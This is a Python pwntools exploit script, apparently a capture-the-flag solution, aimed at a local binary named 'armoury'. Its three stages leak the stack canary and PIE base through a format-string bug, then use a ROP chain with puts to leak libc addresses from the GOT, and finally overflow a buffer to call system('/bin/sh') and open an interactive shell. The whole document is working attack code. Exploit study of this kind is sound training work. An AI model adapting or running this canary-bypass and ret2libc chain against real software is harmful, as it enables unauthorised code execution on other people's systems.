#!/usr/bin/env python

from pwn import *
import re

TIMEOUT = 1.0

# offsets to functions
LIBC_CSU_INIT_OFFSET = 0xca0
MAIN_FUNCTION_OFFSET = 0xb95
PUTS_OFFSET = 0x810

# offsets to GOT entries
PRINTF_GOT_OFFSET = 0x201f98
FGETS_GOT_OFFSET  = 0x201fa8

# offsets to ROP gadgets
POP_RDI_OFFSET = 0xd03

# Libc offsets from the base address
PRINTF_LIBC_OFFSET = 0x4f190
SYSTEM_LIBC_OFFSET = 0x3f480
BIN_SH_LIBC_OFFSET = 0x161c19

def recv_response(p):
    r = p.recv()
    print "[+] Response: " + r
    return r

# Extracts the leaked address from the response provided by the program
def extract_leaked_addr(data):
    m = re.search(r"\.(0x[a-zA-Z0-9]+):", data)
    if m:
        leaked_addr = m.group(1)
    else:
        print "[!] Couldn't extract leaked address!"

    return int(leaked_addr, 16)

# Extracts the address of libc functions and returns them as an integer
def extract_got_leak(bytes):
    addr_bytes = re.split(r"\n", bytes)

    padding_bytes_1 = 8 - len(addr_bytes[1])
    padding_bytes_2 = 8 - len(addr_bytes[2])

    printf_addr = u64(addr_bytes[1] + "\x00" * padding_bytes_1)
    fgets_addr  = u64(addr_bytes[2] + "\x00" * padding_bytes_2)

    return (printf_addr, fgets_addr)

def leak_canary_and_pie(p):
    format_leak = "%p" + ".%p" * 12
    p.sendline(format_leak)

    r = recv_response(p)
    canary = extract_leaked_addr(r)

    print "[+] Leaked canary: " + hex(canary)

    pie_leak = format_leak + ".%p"
    p.sendline(pie_leak)
    r = recv_response(p)
    code_base_addr = extract_leaked_addr(r)
    code_base_addr -= LIBC_CSU_INIT_OFFSET

    return (canary, code_base_addr)

p = process("./armoury")

# Stage one: Leak canary, PIE code address, printf() and fgets() GOT entry addresses
# Using the format string vulnerability
recv_response(p)
(canary, code_base_addr) = leak_canary_and_pie(p)
print "[+] Leaked code address: " + hex(code_base_addr)

puts_addr       = code_base_addr + PUTS_OFFSET
pop_rdi_gadget  = code_base_addr + POP_RDI_OFFSET

printf_got_addr = code_base_addr + PRINTF_GOT_OFFSET
fgets_got_addr  = code_base_addr + FGETS_GOT_OFFSET

print "[+] Function, gadgets and GOT addresses: "
print "\t[-] Puts(): " + hex(puts_addr)
print "\t[-] Pop RDI: " + hex(pop_rdi_gadget)
print "\t[-] printf() GOT: " + hex(printf_got_addr)
print "\t[-] fgets() GOT: " + hex(fgets_got_addr)

# Stage two: Leak the address of the functions printf() and fgets()
# Using the buffer overflow vulnerability
buf = "a" * 0x18
buf += p64(canary)
buf += "b" * 8                  # new RBP value
buf += p64(pop_rdi_gadget)
buf += p64(printf_got_addr)
buf += p64(puts_addr)
buf += p64(pop_rdi_gadget)
buf += p64(fgets_got_addr)
buf += p64(puts_addr)
buf += p64(code_base_addr + MAIN_FUNCTION_OFFSET)

#gdb.attach(p)

p.sendline(buf)

r = recv_response(p)

# Stage 3: Calculate libc base address, system() addr and "/bin/sh" and launch
# the payload to open shell using the buffer overflow vulnerability.
(printf_addr, fgets_addr) = extract_got_leak(r)

print "[+] printf()'s address: " + hex(printf_addr)
print "[+] fgets()'s address: " + hex(fgets_addr)

# Stage 2:
libc_base_addr = printf_addr - PRINTF_LIBC_OFFSET
system_addr    = libc_base_addr + SYSTEM_LIBC_OFFSET
bin_sh_addr    = libc_base_addr + BIN_SH_LIBC_OFFSET

print "[-] Libc offsets: "
print "\t[+] libc base address: " + hex(libc_base_addr)
print "\t[+] system() address: " + hex(system_addr)
print "\t[+] \"/bin/sh\" address: " + hex(bin_sh_addr)

(canary, code_base_addr) = leak_canary_and_pie(p)
buf = "a" * 0x18
buf += p64(canary)
buf += "b" * 8
buf += p64(pop_rdi_gadget)
buf += p64(bin_sh_addr)
buf += p64(system_addr)

#gdb.attach(p)

p.sendline(buf)

p.interactive()
